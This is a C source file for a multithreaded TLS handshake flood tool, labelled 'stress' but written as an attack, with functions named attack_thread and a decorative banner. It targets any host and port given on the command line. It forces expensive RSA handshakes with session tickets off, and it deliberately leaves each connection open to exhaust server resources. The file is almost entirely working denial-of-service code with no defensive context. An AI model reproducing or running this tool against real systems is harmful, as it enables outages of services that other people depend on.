// gcc -o ssl_stress ssl_stress.c -lssl -lcrypto -lpthread

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <stdatomic.h>

#define BANNER "\n\033[1;31m" \
"                            ,-.\n" \
"       ___,---.__          /'|`\          __,---,___\n" \
"    ,-'    \\`    `-.____,-'  |  `-.____,-'    //    `-.\n" \
"  ,'        |           ~'\\     /`~           |        `.\n" \
" /      ___//              `. ,'          ,  , \\___      \n" \
"|    ,-'   `-.__   _         |        ,    __,-'   `-.    |\n" \
"|   /          /\\_  `   .    |    ,      _/\\          \\   |\n" \
"\\  |           \\ \\`-.___ \\   |   / ___,-'/ /           |  /\\\n" \
" \\  \\           | `._   `\\\\  |  //'   _,' |           /  /\\\n" \
"  `-.\\         /'  _ `---'' , . ``---' _  `\\         /,-'\n" \
"     ``       /     \\    ,='/ \\`=.    /     \\       ''\n" \
"\033[0m                * g a l i a n    b e a s t *\n\n"

atomic_long total_connections = ATOMIC_VAR_INIT(0);
atomic_long successful_handshakes = ATOMIC_VAR_INIT(0);
struct sockaddr_in target_addr;

const char *g_target_host;
int g_thread_count;

typedef struct {
    int thread_id;
    int max_attempts;
} ThreadConfig;

void init_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

SSL_CTX* create_ssl_ctx() {
    SSL_CTX *ctx = SSL_CTX_new(TLSv1_2_client_method());
    if (ctx == NULL) {
        fprintf(stderr, "Error creating SSL context\n");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    if (!SSL_CTX_set_options(ctx, SSL_OP_NO_TICKET)) {
        fprintf(stderr, "Error setting SSL context options\n");
    }
    if (!SSL_CTX_set_cipher_list(ctx, "RSA")) {
        fprintf(stderr, "Error setting cipher list\n");
    }
    return ctx;
}

void resolve_target(const char *host, int port) {
    struct hostent *he = gethostbyname(host);
    if (!he) {
        fprintf(stderr, " - Failed to resolve %s\n", host);
        exit(EXIT_FAILURE);
    }
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    memcpy(&target_addr.sin_addr, he->h_addr_list[0], he->h_length);
}

void print_stats() {
    printf("\r\033[34m[+] Connections: %ld | Handshakes: %ld | Threads: %d\033[0m",
           atomic_load(&total_connections), atomic_load(&successful_handshakes), g_thread_count);
    fflush(stdout);
}

void* attack_thread(void* arg) {
    ThreadConfig *config = (ThreadConfig*)arg;
    SSL_CTX *ctx = create_ssl_ctx();

    for (int i = 0; i < config->max_attempts; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
            continue;

        if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
            SSL *ssl = SSL_new(ctx);
            if (ssl == NULL) {
                close(sock);
                continue;
            }
            SSL_set_fd(ssl, sock);
            if (!SSL_set_tlsext_host_name(ssl, g_target_host)) {
                /* Optional error handling */
            }
            if (SSL_connect(ssl) == 1) {
                atomic_fetch_add(&successful_handshakes, 1);
                /* Connection remains open.
                   Do not call SSL_shutdown, SSL_free, or close(sock). */
            } else {
                SSL_free(ssl);
                close(sock);
            }
            atomic_fetch_add(&total_connections, 1);
        } else {
            close(sock);
        }
        
        if (i % 10 == 0)
            print_stats();
    }
    
    free(config);
    SSL_CTX_free(ctx);
    return NULL;
}

int main(int argc, char *argv[]) {
    printf(BANNER);

    if (argc != 4) {
        printf("Usage: %s <IP/HOST> <PORT> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    g_target_host = argv[1];
    int target_port = atoi(argv[2]);
    g_thread_count = atoi(argv[3]);

    resolve_target(g_target_host, target_port);
    init_openssl();

    pthread_t *threads = malloc(g_thread_count * sizeof(pthread_t));
    if (threads == NULL) {
        perror("Failed to allocate memory for threads");
        return EXIT_FAILURE;
    }

    for (int i = 0; i < g_thread_count; i++) {
        ThreadConfig *config = malloc(sizeof(ThreadConfig));
        if (config == NULL) {
            perror("Failed to allocate memory for thread configuration");
            continue;
        }
        config->thread_id = i;
        config->max_attempts = 1000;
        
        if (pthread_create(&threads[i], NULL, attack_thread, config) != 0) {
            perror("Thread creation failed");
            free(config);
        }
    }

    while (atomic_load(&total_connections) < (g_thread_count * 1000)) {
        print_stats();
        sleep(1);
    }

    for (int i = 0; i < g_thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\033[32m[+] All connections established and kept open!\033[0m\n");

    free(threads);
    /* Do not call EVP_cleanup if further SSL operations are expected */
    return EXIT_SUCCESS;
}
